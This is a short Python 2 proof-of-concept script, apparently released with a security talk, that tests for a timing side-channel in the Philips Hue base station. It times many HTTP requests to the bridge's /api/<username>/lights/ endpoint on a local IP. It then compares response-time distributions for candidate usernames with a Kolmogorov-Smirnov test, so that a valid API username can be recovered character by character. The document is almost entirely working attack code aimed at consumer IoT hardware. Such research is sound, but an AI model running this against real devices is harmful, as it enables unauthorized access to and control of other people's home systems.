""" This is a nasty and incomplete script which can be used to verify
that there does in fact exist a timing vulnerability in the Phillips
Hue base station.

Obviously the code released with the talk will be automated, have a
user interface, etc.

If you take enough samples (100k ish depending on many factors),
you'll be able to distinguish between strings which have more or less
of the correct username based on reported p-values.
"""

import time
import curl
import itertools
from scipy import stats
import random
import numpy as np

COUNT = 100

URL = 'http://192.168.0.35/'

def get_data(url):
    print url
    c = curl.Curl(url)
    results = []
    for x in range(COUNT):
        c.get()
        i = c.info()
        yield (i['starttransfer-time'] - i['pretransfer-time']) * 1000

def sfilter(ary1, ary2):
    combined = list(ary1) + list(ary2)
    std = np.std(combined)
    mean = np.mean(combined)
    return (filter(lambda x: x < mean + std, ary1),
            filter(lambda x: x < mean + std, ary2))

def readfile(name):
    res = []
    with open(name) as f:
        for x in f:
            res.append(float(x.strip()))
    return res

start = time.time()

# adjust the usernames here
resit  = get_data(URL + 'api/useX/lights/')
resit2 = get_data(URL + 'api/uszX/lights/')

res = []
res2 = []
for x in range(COUNT):
    res.append(resit.next())
    time.sleep(0.05)
    res2.append(resit2.next())
    time.sleep(0.05)

res, res2 = sfilter(res, res2)
print "Counts: ", len(res), len(res2)
print "KS D:%s p-value:%s" % stats.ks_2samp(res, res2)
print "Elapsed: %s" % (time.time() - start)
print stats.describe(res)

import matplotlib.pyplot as plt
plt.plot(res)
plt.plot(res2)
#plt.hist(res, bins=200, histtype='step')
#plt.hist(res2, bins=200, histtype='step')
plt.show()
